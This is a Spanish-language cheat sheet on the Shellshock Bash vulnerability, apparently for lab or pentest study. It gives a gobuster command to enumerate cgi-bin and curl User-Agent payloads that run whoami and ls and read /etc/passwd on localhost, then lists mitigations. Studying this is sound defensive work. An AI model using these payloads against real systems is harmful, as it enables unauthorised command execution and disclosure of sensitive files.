---

### 💣 **Shellshock Attack Cheat Sheet** 💣

---
---
#### 📝 **¿Qué es el Ataque Shellshock?**  
El ataque **Shellshock** explota una vulnerabilidad en el intérprete de comandos **Bash** en sistemas operativos basados en **Unix y Linux**.  
Fue descubierto en **2014** y se considera una de las vulnerabilidades más críticas en la historia de la informática.  

---

### ⚙️ **¿Cómo funciona Shellshock?**  
La vulnerabilidad surge cuando Bash maneja **variables de entorno**.  
Los atacantes pueden inyectar **código malicioso** en estas variables, que Bash ejecuta sin cuestionar su origen o contenido.  

---

### 💥 **Impacto del Ataque**  
- 📂 **Acceso a información confidencial.**  
- ✏️ **Modificación de archivos.**  
- 🕵️ **Instalación de programas maliciosos.**  
- 💻 **Control total del sistema comprometido.**  

---

### 🌐 **Vector de Ataque: User-Agent**  
Uno de los métodos más comunes de explotación es manipular el **User-Agent** para incluir comandos maliciosos.  
El servidor web ejecutará el comando al recibir la solicitud, especialmente si se encuentra el directorio **`cgi-bin`**.  

---

## 🔎 **Exploración Inicial: Detectando el directorio cgi-bin**

Antes de explotar la vulnerabilidad, es fundamental detectar el directorio **cgi-bin** y los archivos que contiene:  
```bash
gobuster dir -u http://localhost/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi -v
```
- 🔍 **Extensiones comunes:** `.pl`, `.sh`, `.cgi`  
- 💡 **Objetivo:** Encontrar archivos que se puedan explotar.  

---

## 🚀 **Payloads para Explotación usando curl**

Una vez identificado un archivo dentro de **cgi-bin**, intenta ejecutar comandos mediante el encabezado **User-Agent**:  

### 💣 **Ejecutando Comandos en el Servidor**
```bash
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; /usr/bin/whoami"
```
- 💡 **Explicación:** El encabezado **User-Agent** contiene el payload que ejecuta el comando `whoami`.

---

### 🪛 **Payload Alternativo con Echo**
Si el payload anterior no muestra nada, intenta agregar un **echo** antes:  
```bash
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```
- 💡 **Explicación:** El uso de `echo` puede forzar una respuesta más clara si el servidor no muestra la salida directamente.  

---

### 📝 **Otros Comandos para Verificar la Vulnerabilidad**
```bash
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; /bin/ls"
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd"
```
- 📂 **Objetivo:** Verificar la ejecución de comandos arbitrarios y la posibilidad de leer archivos sensibles.  

---

## 🚨 **Consejos de Mitigación**
1. **Actualizar Bash:** Asegúrate de que tu sistema tenga la última versión de Bash.  
2. **Desactivar CGI no necesario:** Deshabilita el uso de scripts CGI si no son imprescindibles.  
3. **Monitoreo de Logs:** Revisa los registros de acceso en busca de patrones sospechosos de comandos en User-Agent.  
4. **Implementar WAF:** Un firewall de aplicaciones web puede bloquear solicitudes maliciosas.  

---
